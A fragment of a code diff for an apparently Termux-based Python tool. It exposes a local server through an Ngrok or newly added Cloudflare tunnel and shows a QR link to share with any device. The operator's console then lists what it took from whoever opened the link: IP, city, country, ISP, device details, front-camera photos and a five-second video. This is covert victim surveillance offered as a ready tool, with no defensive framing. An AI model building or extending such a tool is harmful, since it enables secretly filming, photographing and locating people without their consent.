         print(f"{Fore.YELLOW}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📡 ISP: {isp}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}📸 Photos: 3 images saved to Gallery/DCIM{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🎥 Video: Frame saved to Gallery/DCIM{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}📸 Photos: 3 REAL images from front camera{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}🎥 Video: 5-second REAL video recording{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}📱 Platform: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}🖥️ Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🌐 Browser: {device_info.get('vendor', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🗣️ Language: {device_info.get('language', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}⏰ Timezone: {device_info.get('timezone', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}📶 Connection: {device_info.get('connectionType', 'Unknown')}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}💾 Memory: {device_info.get('deviceMemory', 'Unknown')}GB{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}🎨 Color Depth: {device_info.get('colorDepth', 'Unknown')}-bit{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}📁 Gallery Location: {GALLERY_FOLDER}{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}💾 Backup Location: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
-        if error_msg:
-            print(f"{Fore.RED}⚠️ Errors: {error_msg}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}📁 Gallery Locations:{Style.RESET_ALL}")
+        for path in GALLERY_PATHS:
+            print(f"{Fore.CYAN}   📂 {path}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
         print(f"{Fore.GREEN}📊 Report: {REPORT_CSV}{Style.RESET_ALL}\n")
         
@@ -884,10 +980,11 @@ def main():
     
     print(f"\n{Back.BLUE}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}1. Ngrok Tunnel (Recommended){Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}2. Local Network Only (Same WiFi){Style.RESET_ALL}")
+    print(f"{Fore.BLUE}2. Cloudflare Tunnel{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}3. Local Network Only (Same WiFi){Style.RESET_ALL}")
     print(f"{Back.BLUE}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
     
-    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-2): {Style.RESET_ALL}").strip()
+    choice = input(f"\n{Fore.CYAN}🎯 Choose option (1-3): {Style.RESET_ALL}").strip()
     
     public_url = None
     
@@ -897,25 +994,34 @@ def main():
         else:
             print(f"{Fore.RED}❌ Ngrok installation failed. Using local network.{Style.RESET_ALL}")
     elif choice == '2':
+        if install_cloudflared():
+            public_url = start_cloudflare_tunnel()
+        else:
+            print(f"{Fore.RED}❌ Cloudflared installation failed. Using local network.{Style.RESET_ALL}")
+    elif choice == '3':
         print(f"{Fore.YELLOW}📡 Using local network only (works on same WiFi){Style.RESET_ALL}")
     else:
         print(f"{Fore.RED}❌ Invalid choice. Using local network.{Style.RESET_ALL}")
     
     # Determine final URL to use
-    final_url = public_url if public_url else local_url
+    final_url = public_url if public_url and public_url not in ["cloudflare_tunnel_active"] else local_url
     
     # Display results
     print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
     print(f"{Fore.CYAN}🌐 Public URL: {final_url}{Style.RESET_ALL}")
-    if public_url:
+    if public_url and public_url != "cloudflare_tunnel_active":
         print(f"{Fore.GREEN}✅ This link works on ANY device and ANY network!{Style.RESET_ALL}")
+    elif public_url == "cloudflare_tunnel_active":
+        print(f"{Fore.YELLOW}⚠️  Cloudflare tunnel active - check dashboard for URL{Style.RESET_ALL}")
     else:
         print(f"{Fore.YELLOW}⚠️  This link only works on the same WiFi network{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}📁 Gallery Location: {GALLERY_FOLDER}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}💾 Backup Location: {DOWNLOAD_FOLDER}{Style.RESET_ALL}")
+    
+    print(f"{Fore.GREEN}📁 Gallery Locations:{Style.RESET_ALL}")
+    for path in GALLERY_PATHS:
+        print(f"{Fore.CYAN}   📂 {path}{Style.RESET_ALL}")
     print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
     
-    # Display QR code directly in Termux
+    # Display QR code
     display_qr_in_termux(final_url)
     
     print(f"\n{Fore.YELLOW}🚀 Share this link/QR with ANY device{Style.RESET_ALL}")
